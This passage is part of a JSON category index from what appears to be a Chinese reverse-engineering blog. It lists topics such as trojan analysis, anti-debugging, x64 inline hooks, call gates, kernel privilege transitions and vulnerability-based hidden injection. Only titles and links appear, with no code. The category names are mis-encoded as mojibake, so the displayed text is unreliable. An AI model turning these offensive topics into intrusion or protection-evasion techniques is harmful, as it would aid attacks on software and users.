¸é€†å‘åˆ†æä¸­æœ‰è¶£çš„æŠ€å·§","link":"/categories/%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%80%86%E5%90%91/%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%AD%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"name":"æœ¨é©¬åˆ†æ","slug":"æœ¨é©¬åˆ†æ","link":"/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"name":"è·å–ç³»ç»Ÿç‰ˆæœ¬å·","slug":"å¸¸ç”¨ä»£ç ç¬”è®°/è·å–ç³»ç»Ÿç‰ˆæœ¬å·","link":"/categories/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%AC%94%E8%AE%B0/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%B7/"},{"name":"å¿«æ·é”®","slug":"vscode/å¿«æ·é”®","link":"/categories/vscode/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"api","slug":"é©±åŠ¨å¼€å‘/api","link":"/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/api/"},{"name":"ä¿æŠ¤æ¨¡å¼","slug":"ä¿æŠ¤æ¨¡å¼","link":"/categories/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"},{"name":"x64æ±‡ç¼–","slug":"x64æ±‡ç¼–","link":"/categories/x64%E6%B1%87%E7%BC%96/"},{"name":"x64","slug":"x64","link":"/categories/x64/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"x64æ±‡ç¼–/å­¦ä¹ ç¬”è®°","link":"/categories/x64%E6%B1%87%E7%BC%96/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"x64/å­¦ä¹ ç¬”è®°","link":"/categories/x64/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":".netæœ¨é©¬","slug":"æœ¨é©¬åˆ†æ/netæœ¨é©¬","link":"/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/net%E6%9C%A8%E9%A9%AC/"},{"name":"åè°ƒè¯•","slug":"åè°ƒè¯•","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"æ±‡ç¼–","slug":"x64/æ±‡ç¼–","link":"/categories/x64/%E6%B1%87%E7%BC%96/"},{"name":"ä¿æŠ¤æ¨¡å¼","slug":"x64/ä¿æŠ¤æ¨¡å¼","link":"/categories/x64/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"},{"name":"å†…æ ¸","slug":"x64/å†…æ ¸","link":"/categories/x64/%E5%86%85%E6%A0%B8/"},{"name":"Eç›¾åè°ƒè¯•åˆ†æ","slug":"åè°ƒè¯•/Eç›¾åè°ƒè¯•åˆ†æ","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/E%E7%9B%BE%E5%8F%8D%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"name":"x64InlineHook","slug":"x64/x64InlineHook","link":"/categories/x64/x64InlineHook/"},{"name":"è°ƒç”¨é—¨","slug":"x64/ä¿æŠ¤æ¨¡å¼/è°ƒç”¨é—¨","link":"/categories/x64/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/%E8%B0%83%E7%94%A8%E9%97%A8/"},{"name":"å¼‚å¸¸","slug":"x64/å†…æ ¸/å¼‚å¸¸","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E5%BC%82%E5%B8%B8/"},{"name":"å†…å­˜æ˜ å°„","slug":"x64/å†…æ ¸/å†…å­˜æ˜ å°„","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/"},{"name":"æ¼æ´éšè—æ³¨å…¥","slug":"x64/å†…æ ¸/æ¼æ´éšè—æ³¨å…¥","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E6%BC%8F%E6%B4%9E%E9%9A%90%E8%97%8F%E6%B3%A8%E5%85%A5/"},{"name":"r3è¿›å…¥r0","slug":"x64/å†…æ ¸/r3è¿›å…¥r0","link":"/categories/x64/%E5%86%85%E6%A0%B8/r3%E8%BF%9B%E5%85%A5r0/"},{"name":"x32","slug":"åè°ƒè¯•/x32","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/x32/"},{"name":"R3","slug":"åè°ƒè¯•/R3","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/R3/"}]}